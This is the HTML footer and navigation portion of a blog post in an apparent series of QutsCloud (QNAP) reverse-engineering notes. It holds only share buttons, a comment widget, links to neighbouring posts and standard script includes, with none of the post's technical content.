+            <a class="post-action-btn btn btn--default tooltip--top" href="https://jxcn.org/2022/03/qnap-start-point/" data-tooltip="QutsCloud 逆向笔记 - 启动顺序及切入点" aria-label=": QutsCloud 逆向笔记 - 启动顺序及切入点">
+          
+              <span class="hide-xs hide-sm text-small icon-mr"></span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://jxcn.org/2022/03/qnap-sign-check/" title="" aria-label="">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://jxcn.org/2022/03/qnap-sign-check/" title="" aria-label="">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://jxcn.org/2022/03/qnap-sign-check/" title="" aria-label="">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+    <li class="post-action">
+      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="">
+        <i class="far fa-comment"></i>
+      </a>
+    </li>
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+            
+  
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+    <script type="text/javascript">
+      var disqus_config = function() {
+        this.page.url = 'https:\/\/jxcn.org\/2022\/03\/qnap-sign-check\/';
+        
+          this.page.identifier = '\/2022\/03\/qnap-sign-check\/'
+        
+      };
+      (function() {
+        
+        
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+          document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+          return;
+        }
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        var disqus_shortname = 'something-useless';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+    </script>
+  
+
+
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2023 author: chk-jxcn <br> Powered by HUGO & hugo-tranquilpeak-theme | <script type="text/javascript" src="https://v1.cnzz.com/z_stat.php?id=1281008874&web_id=1281008874"></script>. 
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
+        
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://jxcn.org/2022/03/qnap-license/" data-tooltip="QutsCloud 逆向笔记 - qlicense设备标识文件及许可证文件" aria-label=": QutsCloud 逆向笔记 - qlicense设备标识文件及许可证文件">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml"></span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://jxcn.org/2022/03/qnap-start-point/" data-tooltip="QutsCloud 逆向笔记 - 启动顺序及切入点" aria-label=": QutsCloud 逆向笔记 - 启动顺序及切入点">
+          
+              <span class="hide-xs hide-sm text-small icon-mr"></span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://jxcn.org/2022/03/qnap-sign-check/" title="" aria-label="">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://jxcn.org/2022/03/qnap-sign-check/" title="" aria-label="">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://jxcn.org/2022/03/qnap-sign-check/" title="" aria-label="">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+    <li class="post-action">
+      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="">
+        <i class="far fa-comment"></i>
+      </a>
+    </li>
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+      </div>
+      
+<div id="share-options-bar" class="share-options-bar" data-behavior="5">
+  <i id="btn-close-shareoptions" class="fa fa-times"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fjxcn.org%2F2022%2F03%2Fqnap-sign-check%2F" aria-label="">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i><span></span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fjxcn.org%2F2022%2F03%2Fqnap-sign-check%2F" aria-label="">
+          <i class="fab fa-twitter" aria-hidden="true"></i><span></span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fjxcn.org%2F2022%2F03%2Fqnap-sign-check%2F" aria-label="">
+          <i class="fab fa-linkedin" aria-hidden="true"></i><span></span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+
+
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-times"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://jxcn.org/img/touxiang.jpg" alt="" />
+    
+    <h4 id="about-card-name">chk_jxcn</h4>
+    
+      <div id="about-card-bio">观方知彼去 去者不至方</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        无业
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker-alt"></i>
+        <br/>
+        ***
+      </div>
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    
+      <div id="cover" style="background-image:url('https://jxcn.org/img/sidebar_bg.jpg');"></div>
+    
+  
+
+
+    
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script src="https://cdnjs.loli.net/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha512-uURl+ZXMBrF4AwGaWmEetzrd+J5/8NRkWAvJx5sbPSSuOb0bZLqf+tOzniObO00BjHa/dD7gub9oCGMLPQHtQA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+
+<script src="https://jxcn.org/js/script-yqzy9wdlzix4lbbwdnzvwx3egsne77earqmn73v9uno8aupuph8wfguccut.min.js"></script>
+
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-gE8KAQyFIzV1C9+GZ8TKJHZS2s+n7EjNtC+IMRn1l5+WYJTHOODUM6JSjZhFhqXmc7bG8Av6XXpckA4tYhflnw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/apache.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-EWROca+bote+7Oaaar1F6y74iZj1r1F9rm/ly7o+/FwJopbBaWtsFDmaKoZDd3QiGU2pGacBirHJNivmGLYrow==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/go.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-GDVzAn0wpx1yVtQsRWmFc6PhJiLBPdUic+h4GWgljBh904O3JU10fk9EKNpVyIoPqkFn54rgL2QBG4BmUTMpiQ==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/http.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-UgZlma8NzkrDb/NWgmLIcTrH7i/CSnLLDRFqCSNF5NGPpjKmzyM25qcoXGOup8+cDakKyaiTDd7N4dyH4YT+IA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/less.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-lot9koe73sfXIrUvIPM/UEhuMciN56RPyBdOyZgfO53P2lkWyyXN7J+njcxIIBRV+nVDQeiWtiXg+bLAJZDTfg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/nginx.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-Zd3e7XxHP00TD0Imr0PIfeM0fl0v95kMWuhyAS3Wn1UTSXTkz0OhtRgBAr4JlmADRgiXr4x7lpeUdqaGN8xIog==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/puppet.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-qtqDO052iXMSP+5d/aE/jMtL9vIIGvONgTJziC2K/ZIB1yEGa55WVxGE9/08rSQ62EoDifS9SWVGZ7ihSLhzMA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/scss.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-1NmkjnEDnwwwcu28KoQF8vs3oaPFokQHbmbtwGhFfeDsQZtVFI8zW2aE9O8yMYdpdyKV/5blE4pSWw4Z/Sv97w==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/stylus.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-B2wSfruPjr8EJL6IIzQr1eAuDwrsfIfccNf/LCEdxELCgC/S/ZMt/Uvk80aD79m7IqOqW+Sw8nbkvha20yZpzg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/swift.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-28oDiQZGKUVN6wQ7PSLPNipOcmkCALXKwOi7bnkyFf8QiMZQxG9EQoy/iiNx6Zxj2cG2SbVa4dXKigQhu7GiFw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/yaml.min.js"></script>
+  
+
+
+
+
+
+    
+  </body>
+</html>
+
